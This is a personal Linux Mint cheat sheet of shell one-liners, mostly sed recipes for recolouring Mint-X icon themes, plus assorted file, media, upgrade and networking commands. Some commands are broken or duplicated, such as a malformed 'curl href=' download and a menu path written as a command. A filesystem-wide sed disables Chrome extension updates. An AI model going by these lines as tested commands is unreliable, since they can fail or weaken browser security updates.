$> grep -ri -l "#a7c6df" ~/.icons/Mint-X-White | xargs sed -i -e 's/a7c6df/f7f7f7/g' -e 's/308fba/f7f7f8/g'
##------------------------------------------
## gui. Make LtBlue Theme
## Make home .icons folder to put new icon themes in and copy over Mint-X icons to alter
$> mkdir ~/.icons && \
$> cp -r /usr/share/icons/Mint-X ~/.icons/Mint-X-LtBlue && \
$> cd ~/.icons/Mint-X-LtBlue && \
## Change folder icon edges to opaque
$> grep -ri -l "#a7c6df" ~/.icons/Mint-X-LtBlue | xargs sed -i \
## for opaque "outline"
$> -e 's/path3369-7" style="opacity:0.3/path3369-7" style="opacity:1/g' \
## for opaque "outline" on Documents folder
$> -e 's/path3369-1-3" style="opacity:0.3/path3369-1-3" style="opacity:1/g' \
## for darker "shadow"
$> -e 's/path6127" style="opacity:0.4/path6127" style="opacity:1/g'
## Change color to LtBlue #cce8ff
$> grep -ri -l "#a7c6df" ~/.icons/Mint-X-LtBlue | xargs sed -i -e 's/a7c6df/ffffff/g' -e 's/308fba/cce8ff/g' && \
##==========================================
## gui. Make home .icons folder to put new icon themes in and copy over Mint-X icons to alter
$> mkdir ~/.icons && \
$> cp -r /usr/share/icons/Mint-X ~/.icons/Mint-X-White && \
$> cd ~/.icons/Mint-X-White && \
## Change folder icon edges to opaque
$> grep -ri -l "#a7c6df" ~/.icons/Mint-X-White | xargs sed -i \
## folder outline
$> -e 's/path3369-7" style="opacity:0.3/path3369-7" style="opacity:1/g' \
## folder outline folder-documents.svg
$> -e 's/path3369-1-3" style="opacity:0.3/path3369-1-3" style="opacity:1/g' \
## folder outline folder-music.svg
$> -e 's/path3369-7-50" style="opacity:0.3/path3369-7-50" style="opacity:1/g' \
## folder outline folder-recent.svg
$> -e 's/path3369-7-3" style="opacity:0.3/path3369-7-3" style="opacity:1/g' \
## folder outline folder-drag-accept.svg
$> -e 's/path3369-8-9" style="opacity:0.3/path3369-8-9" style="opacity:1/g' \
## folder outline folder-drag-accept.svg
$> -e 's/path3369-7-1" style="opacity:0.3/path3369-7-1" style="opacity:1/g' \
## Dark shadow
$> -e 's/path6127" style="opacity:0.4/path6127" style="opacity:1/g'  \
## Change color to the color you like, LtBlue #cce8ff
$> -e "s/5e8048/888889/g" -e "s/4a6438/000001/g" \
$> -e "s/aacb7d/$2/g" -e "s/709937/$1/g" ;
##------------------------------------------
## gui. Make any color icons in Mint17x from Mint-X-Aqua. Usage iconcolor HexForYour1stColor HexForYour2ndColor i.e. f7f7f9 bb55bb for Lavender & White
$> function iconcolors () {
$> 	cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-$1-$2 ;
$>     cd ~/.icons/Mint-X-$1-$2 ;
$>     grep -ri -l "#a7c6df" | xargs sed -i \
$>     -e 's/path3369-7" style="opacity:0.3/path3369-7" style="opacity:1/g' \
$>     -e 's/path3369-1-3" style="opacity:0.3/path3369-1-3" style="opacity:1/g' \
$>     -e 's/path3369-7-50" style="opacity:0.3/path3369-7-50" style="opacity:1/g' \
$>     -e 's/path3369-7-3" style="opacity:0.3/path3369-7-3" style="opacity:1/g' \
$>     -e 's/path3369-8-9" style="opacity:0.3/path3369-8-9" style="opacity:1/g' \
$>     -e 's/path3369-7-1" style="opacity:0.3/path3369-7-1" style="opacity:1/g' ;
$>     grep -ri -l "#a7c6df" | xargs sed -i -e "s/a7c6df/$2/g" -e "s/308fba/$1/g" ;
$> }
##------------------------------------------
## gui. Make any color icons in Mint17x from the full Mint-X icon set. Usage: iconcolor HexForYour1stColor HexForYour2ndColor i.e. bb55bb f7f7f9 for Lavender & White
$> function iconcolors () {
$> 	cp -r /usr/share/icons/Mint-X ~/.icons/Mint-X-$1-$2 ;
$>     cd ~/.icons/Mint-X-$1-$2 ;
$>     grep -ri -l "#aacb7d" | xargs sed -i \
$>     -e 's/path3369-7" style="opacity:0.3/path3369-7" style="opacity:1/g' \
$>     -e 's/path3369-1-3" style="opacity:0.3/path3369-1-3" style="opacity:1/g' \
$>     -e 's/path3369-7-50" style="opacity:0.3/path3369-7-50" style="opacity:1/g' \
$>     -e 's/path3369-7-3" style="opacity:0.3/path3369-7-3" style="opacity:1/g' \
$>     -e 's/path3369-8-9" style="opacity:0.3/path3369-8-9" style="opacity:1/g' \
$>     -e 's/path3369-7-1" style="opacity:0.3/path3369-7-1" style="opacity:1/g' ;
$>     grep -ri -l "#aacb7d" | xargs sed -i -e "s/5e8048/888889/g" -e "s/4a6438/000001/g" ;
$>     grep -ri -l "#aacb7d" | xargs sed -i -e "s/aacb7d/$2/g" -e "s/709937/$1/g" ;
$> }
##------------------------------------------
## gui. Transform Mint Linux 17 icons to create any color
$> function iconcolors () { cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-$1-$2 ; cd ~/.icons/Mint-X-$1-$2 ; grep -ri -l "#a7c6df" | xargs sed -i -e 's/"opacity:0/"opacity:1/g' -e "s/0b5a7d/888889/g" -e "s/a7c6df/$2/g" -e "s/308fba/$1/g" ; }
##------------------------------------------
## gui. Make any color icons from Mint-X-Aqua. Usage: iconcolor HexForYour1stColor HexForYour2ndColor i.e. bb55bb f7f7f9 for Lavender & White
$> function iconcolorMint-X-Aqua () {
$> 	cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-$1-$2 ;
$>     cd ~/.icons/Mint-X-$1-$2 ;
$>     grep -ri -l "#a7c6df" | xargs sed -i \
$>     -e 's/path3369-7" style="opacity:0.3/path3369-7" style="opacity:1/g' \
$>     -e 's/path3369-1-3" style="opacity:0.3/path3369-1-3" style="opacity:1/g' \
$>     -e 's/path3369-7-50" style="opacity:0.3/path3369-7-50" style="opacity:1/g' \
$>     -e 's/path3369-7-3" style="opacity:0.3/path3369-7-3" style="opacity:1/g' \
$>     -e 's/path3369-8-9" style="opacity:0.3/path3369-8-9" style="opacity:1/g' \
$>     -e 's/path3369-7-1" style="opacity:0.3/path3369-7-1" style="opacity:1/g' \
$>     -e 's/path6127" style="opacity:0.4/path6127" style="opacity:1/g'  ;
$>     grep -ri -l "#a7c6df" | xargs sed -i -e "s/0b5a7d/888889/g" ;
$>     grep -ri -l "#a7c6df" | xargs sed -i -e "s/a7c6df/$2/g" -e "s/308fba/$1/g" ;
$> }
##------------------------------------------
## gui. Make any color icons in Mint17x from the full Mint-X icon set. Usage: iconcolor HexForYour1stColor HexForYour2ndColor i.e. bb55bb f7f7f9 for Lavender & White
$> function iconcolorsMint-X () {
$> 	cp -r /usr/share/icons/Mint-X ~/.icons/Mint-X-$1-$2 ;
$>     cd ~/.icons/Mint-X-$1-$2 ;
$>     grep -ri -l "#aacb7d" | xargs sed -i \
$>     -e 's/path3369-7" style="opacity:0.3/path3369-7" style="opacity:1/g' \
$>     -e 's/path3369-1-3" style="opacity:0.3/path3369-1-3" style="opacity:1/g' \
$>     -e 's/path3369-7-50" style="opacity:0.3/path3369-7-50" style="opacity:1/g' \
$>     -e 's/path3369-7-3" style="opacity:0.3/path3369-7-3" style="opacity:1/g' \
$>     -e 's/path3369-8-9" style="opacity:0.3/path3369-8-9" style="opacity:1/g' \
$>     -e 's/path3369-7-1" style="opacity:0.3/path3369-7-1" style="opacity:1/g' \
$>     -e 's/path6127" style="opacity:0.4/path6127" style="opacity:1/g' ;
$>     grep -ri -l "#aacb7d" | xargs sed -i -e "s/5e8048/888889/g" -e "s/4a6438/000001/g" ;
$>     grep -ri -l "#aacb7d" | xargs sed -i -e "s/aacb7d/$2/g" -e "s/709937/$1/g" ;
$> }
##------------------------------------------
## gui. Change the shortcut/symlink/symbolic-link arrows from on top of desktop icons. USAGE: symbolic-link-gnome /path/to/your.png
$> function symbolic-link-gnome {
$> sudo cp $1 /usr/share/icons/gnome/16x16/emblem/emblem-symbolic-link.png ;
$> sudo cp $1 /usr/share/icons/gnome/22x22/emblem/emblem-symbolic-link.png ;
$> sudo cp $1 /usr/share/icons/gnome/24x24/emblem/emblem-symbolic-link.png ;
$> sudo cp $1 /usr/share/icons/gnome/32x32/emblem/emblem-symbolic-link.png ;
$> sudo cp $1 /usr/share/icons/gnome/48x48/emblem/emblem-symbolic-link.png ;
$> sudo cp $1 /usr/share/icons/gnome/256x256/emblem/emblem-symbolic-link.png ;
$> sudo gtk-update-icon-cache /usr/share/icons/gnome ;
$> }
##------------------------------------------
## gui. Change the shortcut/symlink/symbolic-link arrows from on top of desktop icons. USAGE: symbolic-link /path/to/your.png
$> function symbolic-link {
$> sudo cp $1 /usr/share/icons/Mint-X/emblems/16/emblem-symbolic-link.png ;
$> sudo cp $1 /usr/share/icons/Mint-X/emblems/22/emblem-symbolic-link.png ;
$> sudo cp $1 /usr/share/icons/Mint-X/emblems/24/emblem-symbolic-link.png ;
$> sudo cp $1 /usr/share/icons/Mint-X/emblems/32/emblem-symbolic-link.png ;
$> sudo cp $1 /usr/share/icons/Mint-X/emblems/48/emblem-symbolic-link.png ;
$> sudo cp $1 /usr/share/icons/Mint-X/emblems/96/emblem-symbolic-link.png ;
$> sudo gtk-update-icon-cache /usr/share/icons/Mint-X ;
$> }
$>
##------------------------------------------
##------------------------------------------
## Make any color icons in Mint17x from the full Mint-X icon set. Usage: iconcolor HexForYour1stColor HexForYour2ndColor i.e. bb55bb f7f7f9 for Lavender & White
$> function iconcolorsMint-X () {
$> 	cp -r /usr/share/icons/Mint-X ~/.icons/Mint-X-$1-$2 ;
$>     cd ~/.icons/Mint-X-$1-$2 ;
$>     grep -ri -l "#aacb7d" | xargs sed -i \
$>     -e 's/path3369-7" style="opacity:0.3/path3369-7" style="opacity:1/g' \
$>     -e 's/path3369-1-3" style="opacity:0.3/path3369-1-3" style="opacity:1/g' \
$>     -e 's/path3369-7-50" style="opacity:0.3/path3369-7-50" style="opacity:1/g' \
$>     -e 's/path3369-7-3" style="opacity:0.3/path3369-7-3" style="opacity:1/g' \
$>     -e 's/path3369-8-9" style="opacity:0.3/path3369-8-9" style="opacity:1/g' \
$>     -e 's/path3369-7-1" style="opacity:0.3/path3369-7-1" style="opacity:1/g' \
$>     -e 's/path6127" style="opacity:0.4/path6127" style="opacity:1/g' ;
$>     grep -ri -l "#aacb7d" | xargs sed -i -e "s/5e8048/888889/g" -e "s/4a6438/000001/g" ;
$>     grep -ri -l "#aacb7d" | xargs sed -i -e "s/aacb7d/$2/g" -e "s/709937/$1/g" ;
$> }
##------------------------------------------
$> function iconcolors () { cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-$1-$2 ; cd ~/.icons/Mint-X-$1-$2 ; grep -ri -l "#a7c6df" | xargs sed -i -e 's/"opacity:0/"opacity:1/g' -e "s/0b5a7d/888889/g" -e "s/a7c6df/$2/g" -e "s/308fba/$1/g" ; }
##------------------------------------------
$> function iconcolors () { cp -r /usr/share/icons/Mint-X      ~/.icons/Mint-X-$1-$2 ; cd ~/.icons/Mint-X-$1-$2 ; grep -ri -l "#aacb7d" | xargs sed -i -e 's/"opacity:0/"opacity:1/g' -e "s/5e8048/888889/g" -e "s/aacb7d/$2/g" -e "s/709937/$1/g" ; }
##==========================================
## gui. Resize icons on desktop
## Restore "Resize Icon..." contex menu on desktop Linux Mint. In a terminal, this will restore the legacy desktop behavior, including the ability to resize icons. "Resize Icon..." contex menu. gui changes
$> gsettings set org.nemo.desktop use-desktop-grid false
## Or GUI
## Install dconf-editor, run it, in left column go to path org > nemo > desktop and untick the option "use-desktop-grid" and you can freely resize icons on desktop.
$> sudo apt-get install dconf-editor
$> org > nemo > desktop
## untick the option
$> "use-desktop-grid"
##==========================================
## gui. Disable updates for installed Chrome plugins
## This will allow you to ensure you do not get nagged by updates and also protects you from watering hole attacks! Please be sure to make sure your plugins do not have any security issues! Backups are manifext.jason.bak credit @Jay https://chat.counterpoint.info
$> find / -iname "manifest.json" -exec sed 's/\"update_url\": \"http/\"update_url\": \"hxxp/g' -i.bak '{}' \;
##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================
## #################################################
## ##    END GUI Control
## #################################################
##==========================================
##
##
##
##==========================================
## ###################################################
## ##    UNSORTED
## ###################################################
##==========================================
## Script to sync and merge two directories.
#!/bin/sh
# Merge all files in two directories of your choice
$> zenity --question --title="Direcrory sync program" --text="Press Yes to pick directories to sync."
$> DIR1=$(zenity --file-selection --directory --title="Select first directory to sync")
$> DIR1=$(echo $DIR1/)
$> DIR2=$(zenity --file-selection --directory --title="Select second directory to sync")
$> DIR2=$(echo $DIR2/)
$> notify-send "Syncing" "The files are syncing."
$> rsync -avu $DIR1 $DIR2 | tee SYNC1.txt
$> rsync -avu $DIR2 $DIR1 | tee -a SYNC1.txt
$> # SYNC1=$(cat SYNC1.txt)
$> # SYNC2=$(cat SYNC2.txt)
$> zenity --text-info --title="Finished sync." --filename=SYNC1.txt
##==========================================
## Add an "alert" alias to notify for long running commands. Ex: sleep 10; alert
$> alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
##==========================================
## firefox nightly
$> sudo add-apt-repository ppa:ubuntu-mozilla-daily/ppa
$> sudo apt-get update
$> sudo apt-get install firefox-trunk
##==========================================
## Get your Firefox bookmarks
$> sqlite3 ~/.mozilla/firefox/*.[dD]efault/places.sqlite "SELECT strftime('%d.%m.%Y %H:%M:%S', dateAdded/1000000, 'unixepoch', 'localtime'),url FROM moz_places, moz_bookmarks WHERE moz_places.id = moz_bookmarks.fk ORDER BY dateAdded;"
## Extracts yours bookmarks out of sqlite with the format:
## dateAdded|url
##==========================================
## Show Firefox Addons
$> jshon -e addons -a -e defaultLocale -e name -u < ~/.mozilla/firefox/*.[dD]efault/extensions.json
##==========================================
## Install dconf-editor, run it, in left column go to path org > nemo > desktop and untick the option "use-desktop-grid" and you can freely resize icons on desktop.
$> sudo apt-get install dconf-editor
$> org > nemo > desktop
## untick the option 
"use-desktop-grid" 
##==========================================
## Disable updates for installed Chrome plugins
## This will allow you to ensure you do not get nagged by updates and also protects you from watering hole attacks! Please be sure to make sure your plugins do not have any security issues! Backups are manifext.jason.bak credit @Jay https://chat.counterpoint.info
$> find / -iname "manifest.json" -exec sed 's/\"update_url\": \"http/\"update_url\": \"hxxp/g' -i.bak '{}' \;
##==========================================
## Convert libreoffice files : .odt .odg and other to .pdf
## Find and Convert all libre office files to PDF without libreoffice GUI Show Sample Output
$> find /home/foo/Documents/ -type f -iname "*.odt" -exec libreoffice --headless --convert-to pdf '{}' \;
##==========================================
## gui. app. Adminer. SQL GUI. The whole application is in one PHP file, which means that the deployment is as easy as it can get. It's more powerful than phpMyAdmin; it can edit views, procedures, triggers, etc.
$> sudo apt-get install adminer
##==========================================
## gui. Restore "Resize Icon..." contex menu on desktop Linux Mint. In a terminal, this will restore the legacy desktop behavior, including the ability to resize icons. "Resize Icon..." contex menu. gui changes
$> gsettings set org.nemo.desktop use-desktop-grid false
##==========================================
## shell. sed. Replace all instances of "A" with "B" in file "source" saved as file "destination"
$> xxd -p source | fold -w2 | paste -sd' ' | sed "s/A/B/g" | xxd -p -r > destination
##==========================================
## multimedia. audio. Play White noise from urandom
$> aplay -c 2 -f S16_LE -r 44100 /dev/urandom
##==========================================
## files. List files newest first
$> ls -lt --time=atime
##==========================================
## files. shell. Find and replace specific characters in a single line in multiple files with sed
$> for f in `ls`; do sed -i '/MATCHING STRING/ { s/ORIGINAL/REPLACEMENT/; }' ${f} ; done
##==========================================
## multimedia. video. mp4 to mpeg for dvd creation
$> avconv -i FILE.mp4 -f dvd -c:v:0 mpeg2video -s 720x576 -r 25 -g 15 -b:v:0 8000000 -maxrate:v:0 8000000 -minrate:v:0 8000000 -bufsize:v:0 1835008 -packetsize 2048 -muxrate 10080000 -b:a 192000 -ar 48000 -c:a:0 ac3 -map 0:v -map 0:a FILE.mpeg
##==========================================
## os. hardware. Show drive names next to their full serial number (and disk info)
$> find /dev/disk/by-id -type l -printf "%l\t%f\n" | cut -b7- | sort
##==========================================
## files. Add a file to a .tar ball.
$> tar -rvf archive.tar file.txt
##==========================================
## os. hardware. disk. Change partition label
## EXT linux filesystem
## Get present label
$> sudo e2label /dev/sdb1
## linux file system type ext/ext3/ext4 partition
$> sudo e2label /dev/sdb1 NEWLABEL
##------------------------------------------
## os. hardware. storage. NTFS Microsoft Windows filesystem
## NTFS partitions, use ntfslabel from the ntfs-3g package. 128 characters maximum characters in label
## Check the current label
$> sudo ntfslabel /dev/sdb1
## Change to new label
$> sudo ntfslabel /dev/sdb1 NEWLABEL
##------------------------------------------
## os. hardware. disk. FAT FAT32 DOS filesystem
## FAT partitions the tool to use is "mlabel"
## Check the current label, mlabel is part of the mtools-package
$> sudo mlabel -i /dev/sdb1 ::
## Change to new label
$> sudo mlabel -i /dev/sdb1 ::NEWLABEL
##==========================================
## web. Search the internet
## Written by Julian Assange
$> man surfraw # -elvi list of search engines, -dump,
$> sudo mcedit /etc/xdg/surfraw/conf
## man
$> surfraw google -results=100 -dump PATTERN
##==========================================
## web. Setup a transmission bittorent server
$> sudo apt-get install  transmission-gtk transmission-remote-cli transmission-daemon transmission-common transmission
## Add user debian-transmission to your group to access directories
$> sudo usermod -a -G debian-transmission USERNAME
## Fix settings to match computer
$> sudo nano /etc/transmission-daemon/settings.json
## Modify parameters, download-dir, incomplete-dir, rpc-username, rpc-password
$> sudo service transmission-daemon reload  # start/stop/reload
## Go to http://localhost:9091
## ~/.config/transmission-daemon
##==========================================
## files. filebrowser. Make mc always display non-blue background
$> echo "alias mc='mc -S gotan'" >> .bashrc
##==========================================
## web video. Upgrade youtube-dl. DEPRECATED. Upgrade to yt-dlp
$> $ youtube-dl --version
#> 2014.02.17
$> sudo mv /usr/bin/youtube-dl /usr/bin/youtube-dl.old
$> sudo curl href=https://yt-dl.org/downloads/latest/youtube-dl -o /usr/bin/youtube-dl
$> sudo chmod 755 /usr/bin/youtube-dl
$> youtube-dl --version
#> 2015.12.13
##------------------------------------------
## Upgrade youtube-dl DEPRECATED. Upgrade to yt-dlp
$> $ youtube-dl --version
#> 2014.02.17
$> sudo mv /usr/bin/youtube-dl /usr/bin/youtube-dl.old
## Change date to most recent
$> cd /usr/bin/ && sudo wget github.com/rg3/youtube-dl/releases/download/2017.07.15/youtube-dl
$> youtube-dl --version
#> 2017.07.15
##==========================================
## os. How to upgrade from Linux Mint 17 Qiana to Linux Mint 17.1 Rebecca
$> sudo apt-get update
$> sudo apt-get upgrade
$> sudo apt-get dist-upgrade
## First, backup to official sources, just in case, if something unexpected happens
$> sudo cp /etc/apt/sources.list.d/official-package-repositories.list /etc/apt/sources.list.d/official-package-repositories.list.bak
## Next, replace old name (qiana) with new name (rebecca), in the sources file. Instead of doing this by hand, taking the lines one by one, I will be using this sed oneliner:
$> sudo sed -i 's/qiana/rebecca/g' /etc/apt/sources.list.d/official-package-repositories.list
## Now, in order to finish the upgrade process, we have to update the local repository index and perform a regular system upgrade
$> sudo apt-get update
$> sudo apt-get dist-upgrade
## Revert the changes, only if the upgrade process does not finalize successfully
## Replace the modified sources list with the backup
#$> sudo rm /etc/apt/sources.list.d/official-package-repositories.list
#$> sudo mv /etc/apt/sources.list.d/official-package-repositories.list.bak /etc/apt/sources.list.d/official-package-repositories.list
## Upgrade the repository index and perform a system upgrade
#$> sudo apt-get update
#$> sudo apt-get dist-upgrade
##==========================================
## files. Move all located items to folder
$> locate -0 -i *barthes* | xargs -0 mv -t ~/'Books/Barthes, Roland'
##==========================================
## os. Upgrade to new distribution
$> sudo cp /etc/apt/sources.list.d/official-package-repositories.list /etc/apt/sources.list.d/official-package-repositories.list.qiana.bak
$> sudo cp /etc/apt/sources.list.d/official-package-repositories.list /etc/apt/sources.list.d/official-package-repositories.list.rebecca.bak
$> sudo sed -i 's/qiana/rebecca/g' /etc/apt/sources.list.d/official-package-repositories.list
$> sudo sed -i 's/rebecca/rafaela/g' /etc/apt/sources.list.d/official-package-repositories.list
$> sudo sed -i 's/rafaela/rosa/g' /etc/apt/sources.list.d/official-package-repositories.list
$> sudo apt-get update
$> sudo apt-get dist-upgrade
$> sudo sed -i 's/rebecca/rosa/g' /etc/apt/sources.list.d/official-package-repositories.list
##==========================================
## network. ssh. Copy files to and from server over ssh with scp - secure copy
$> scp USER@192.168.1.11:/tmp/shot.png ~/
##==========================================
## mulimedia. video. Convert SWF to video
## This will dump a raw BGRA pixel stream and WAV which must then be converted to video:
$> ffmpeg -f rawvideo -c:v rawvideo -s 1280x720 -r 12 -pix_fmt bgra -i "${i%.*}".bgra -c:v libx264 -preset veryslow -qp 0 -movflags +faststart -i "${i%.*}".wav -c:a libfdk_aac -b:a 384k "${i%.*}".mp4 ; rm "${i%.*}".bgra "${i%.*}".wav
## Our example generates an x264/720p/12fps/AAC best-quality MP4.
## To get dump-gnash, first install the build-dependencies for gnash (this step is OS-specific). Then:
$> git clone http://git.savannah.gnu.org/r/gnash.git ; cd gnash ; ./autogen.sh ; ./configure --enable-renderer=agg --enable-gui=dump --disable-menus --enable-media=ffmpeg --disable-jemalloc ; make
$> i=in.swf; dump-gnash -1 -j 1280 -k 720 -D "${i%.*}".bgra@12 -A "${i%.*}".wav "${i}"
## Count the number of pages of all PDFs in current directory and all subdirs, recursively
$> find . -name "*.pdf" -exec pdftk {} dump_data output \; | grep NumberOfPages | awk '{print $1,$2}'
##==========================================
## files. List all files modified by a command
$> D="$(date "+%F %T.%N")"; [COMMAND]; find . -newermt "$D"
## Often you run a command, but afterwards youre not quite sure what it did.
## By adding this prefix/suffix around [COMMAND], you can list any files that were modified.
## Take a nanosecond timestamp: YYYY-MM-DD HH:MM:SS.NNNNNNNNN
$> date "+%F %T.%N"
## Find any files that have been modified since that timestamp:
$> find . -newermt "$D"
## This command currently only searches below the current directory.
## If you want to look elsewhere change the find parameter, e.g.
$> find /var/log . -newermt "$D"
##==========================================
## web. networking. Monitor all DNS queries made by Firefox
$> NSPR_LOG_MODULES=nsHostResolver:5 NSPR_LOG_FILE=/tmp/log.txt firefox
##==========================================
## os. update. Rolling upgrades via aptitude
$> sudo sh -c "aptitude update; aptitude -DrVWZ full-upgrade; aptitude autoclean; exit"
##==========================================
## web. Monitor Ebay for cheap things with shipping
## The ebay URL is the search query copied from the browser (here searching for bed stuff). The regex is for crap that should not be shown. Important is "Pickup only", which filters away all the things that cannot be shipped (a filter that cannot be done on Ebays webpage).
## It will output the title and url for all matching items, for all pages of the search result.
$> xidel --quiet 'http://www.ebay.com/sch/Beds-Bed-Frames-/175758/i.html?_from=R40&_sac=1&_sop=15&_nkw=bed' -e 'css(".lvresult")[not(matches(., "Pickup only|BUILDING PLANS \(ONLY\)|PARTS LIST"))]/css(".lvtitle")/(.||": "||a/@href)'  -f 'css("a.gspr.next")'
##==========================================
## os. gui. Keep a log of the active windows
## This logs the titles of the active windows, thus you can monitor what you have done during which times. (it is not hard to also log the executable name, but then it is gets too long)
$> while true; do (echo -n $(date  +"%F %T"):\ ; xwininfo -id $(xprop -root|grep "ACTIVE_WINDOW("|cut -d\  -f 5) | grep "Window id" | cut -d\" -f 2 ) >> logfile; sleep 60; done
##==========================================
## Run a command multiple times with different subcommands
## Its nice to be able to use the command
$> ls program.{h,c,cpp}
## This expands to
$> ls program.h program.c program.cpp
## Note: This is a text expansion, not a shell wildcard type expansion that looks at matching file names to calculate the expansion. More details at http://www.linuxjournal.com/content/bash-brace-expansion
## I often run multiple commands (like apt-get) one after the other with different subcommands. Just for fun this wraps the whole thing into a single line that uses brace expansion.
$> echo apt-get\ {update,-y\ upgrade}\ \&\& true | sudo bash
##==========================================
## Check how far along (in %) your program is in a file
$> F=bigdata.xz; lsof -o0 -o -Fo $F | awk -Ft -v s=$(stat -c %s $F) '/^o/{printf("%d%%\n", 100*$2/s)}'
## Imagine youve started a long-running process that involves piping data, but you forgot to add the progress-bar option to a command.
$> xz -dc bigdata.xz | complicated-processing-program > summary
## This command uses lsof to see how much data xz has read from the file.
$> lsof -o0 -o -Fo FILENAME
## Display offsets (-o), in decimal (-o0), in parseable form (-Fo)
## This will output something like:
## p12607
## f3
## o0t45187072
## Process id (p), File Descriptor (f), Offset (o)
## We stat the file to get its size
$> stat -c %s FILENAME
## Then we plug the values into awk.
## Split the line at the letter t: -Ft
## Define a variable for the files size: -s=$(stat...)
## Only work on the offset line: /^o/
## Note this command was tested using the Linux version of lsof.
## Because it uses lsofs batch option (-F) it may be portable.
##------------------------------------------
$> f=bigdata.xz; calc "round($(lsof -o0 -o "$f"|awk '{o=substr($7,3)}END{print o}')/$(stat -c %s "$f")*100)"
## Check how far along (in %) your program is in a file
## Say youre started
$> xzcat bigdata.xz | complicated-processing-program >summary
## an hour ago, and you of course forgot to
## enable progress output
$> | awk 'NR%1000==0{print NR>"/dev/stderr"}{print}'
## in the pipeline but its too late for that now).
## But you really want some idea of how far along your program is. Then you can run the above command to see how many % along xzcat is in reading the file.
## Note that this is for the GNU/Linux version of lsof; the one found on e.g. Darwin has slightly different output so the awk part may need some tweaks.
##==========================================
## os. hardware. battery. Monitors battery usage (rate of energy charge/discharge)
$> while cat energy_now; do sleep 1; done |awk -v F=$(cat energy_full) -v C=60 'NR==1{P=B=$1;p=100/F} {d=$1-P; if(d!=0&&d*D<=0){D=d;n=1;A[0]=B=P}; if(n>0){r=g=($1-B)/n;if(n>C){r=($1-A[n%C])/C}}; A[n++%C]=P=$1; printf "%3d %+09.5f %+09.5f\n", p*$1, p*g, p*r}'
## Needs to be run in a battery sysfs dir, eg. /sys/class/power_supply/BAT0
## Displays the battery's current charge and the rate per-second at which energy is {dis,}charging. All values are displayed as percentages of "full" charge.
## The first column is the current charge. The second is the rate of change averaged over the entire lifetime of the command (or since the AC cable was {un,}plugged), and the third column is the rate of change averaged over the last minute (controlled by the C=60 variable passed to awk).
## The sample output captures a scenario where I ran 'yes' in another terminal to max out a CPU. My battery was at 76% charge and you can see the energy drain starts to rise above 0.01% per-second as the cpu starts working and the fan kicks in etc. While idle it was more like 0.005% per-second.
## I tried to use this to estimate the remaining battery life/time until fully charged, but found it to be pretty useless... As my battery gets more charged it starts to charge slower, which meant the estimate was always wrong. Not sure if that's common for batteries or not.
##==========================================
## web. Get simple weather info from wunderground.com with a zip code 94110 San Francisco
$> curl -s "http://www.wunderground.com/q/zmw:94110.1.99999" | grep "og:title" | cut -d\" -f4 | sed 's/&deg;/ degrees F/'
##==========================================
## list files recursively by size
$> stat -c'%s %n' **/* | sort -n
##==========================================
## Print all open regular files sorted by the number of file handles open to each.
$> find /proc/*/fd -xtype f -printf "%l\n" | grep -P '^/(?!dev|proc|sys)' | sort | uniq -c | sort -n
## List all open files of all processes.
## find /proc/*/fd
## Look through the /proc file descriptors
## -xtype f
## list only symlinks to file
## -printf "%l\n"
## print the symlink target
## grep -P '^/(?!dev|proc|sys)'
## ignore files from /dev /proc or /sys
## sort | uniq -c | sort -n
## count the results
## Many processes will create and immediately delete temporary files.
## These can the filtered out by adding:
$> ... | grep -v " (deleted)$" | ...
$> lsof -a -d 1-99 -Fn / | grep ^n | cut -b2- | sort | uniq -c | sort -n
$> sudo lsof | egrep 'w.+REG' | awk '{print $10}' | sort | uniq -c | sort -n
##==========================================
## Read and write to TCP or UDP sockets with common bash tools
$> exec 5<>/dev/tcp/time.nist.gov/13; cat <&5 & cat >&5; exec 5>&-
## Ever needed to test firewalls but didnt have netcat, telnet or even FTP?
## Enter /dev/tcp, your new best friend. /dev/tcp/(hostname)/(port) is a bash builtin that bash can use to open connections to TCP and UDP ports.
## This one-liner opens a connection on a port to a server and lets you read and write to it from the terminal.
## How it works:
## First, exec sets up a redirect for /dev/tcp/$server/$port to file descriptor 5.
## Then, as per some excellent feedback from @flatcap, we launch a redirect from file descriptor 5 to STDOUT and send that to the background (which is what causes the PID to be printed when the commands are run), and then redirect STDIN to file descriptor 5 with the second cat.
## Finally, when the second cat dies (the connection is closed), we clean up the file descriptor with 'exec 5>&-'.
## It can be used to test FTP, HTTP, NTP, or can connect to netcat listening on a port (makes for a simple chat client!)
## Replace /tcp/ with /udp/ to use UDP instead.
##==========================================
## web. logs. Sort Apache access.log by date and time
$> sort -s -b -t' ' -k 4.9,4.12n -k 4.5,4.7M -k 4.2,4.3n -k 4.14,4.15n -k 4.17,4.18n -k 4.20,4.21n access.log*
## Sort Apache access logs by date and time using sort key field feature
##==========================================
## ???????????
## Prepend text to a file
#$> echo "text to prepend" | cat - file
##==========================================
## SSH connection through host in the middle; with key redirection.
$> ssh -o "ProxyCommand ssh user@reachable_host -W %h:%p" user@unreacheable_host
## This command uses the reachable_host as a proxy; redirecting your request to the unreachable_host.
## The main advantage is that you need only one ssh key. You copy the public part to both servers and you can access the unreachable_host without a ## problem.
## Also, you can put this on ~/.ssh/config to access the unreachable_host directly:
## # config
## unreachable_host
## ProxyCommand ssh user@reachable_host -W %h:%p
## and, then, just ssh user@unreachable_host.
##==========================================
## web. os. shell. diff. Convert diff output to HTML ins/del.
$> diff a.txt b.txt | grep -E '^(<|>)' | sed 's:^< \(.*\):<del style="color\:red; text-decoration\: none">- \1</del><br>:' | sed 's:^> \(.*\):<ins ## style="color\:green; text-decoration\: none">+ \1</ins><br>:'
##==========================================
## shell. Fast command-line directory browsing.
$> cdls() { if [[ $1 != "" ]] ; then cd $1; ls; else ls; fi };
## Not really alternative, just giving a different behavior listing current directory if no directory given.
##==========================================
## hardware. disk. A sorted summary of disk usage including hidden files and folders.
$> du -hs .[^.]* * | sort -h
## Same result as with 'du -ks .[^.]* * | sort -n' but with size outputs in human readable format (e.g., 1K 234M 2G)
##==========================================
## shell. Wait for file to stop changing
$> echo FileName | perl -nlE'sleep 1 while time-(stat)[10]<10' && echo DONE
## perl version of "Wait for file to stop changing"
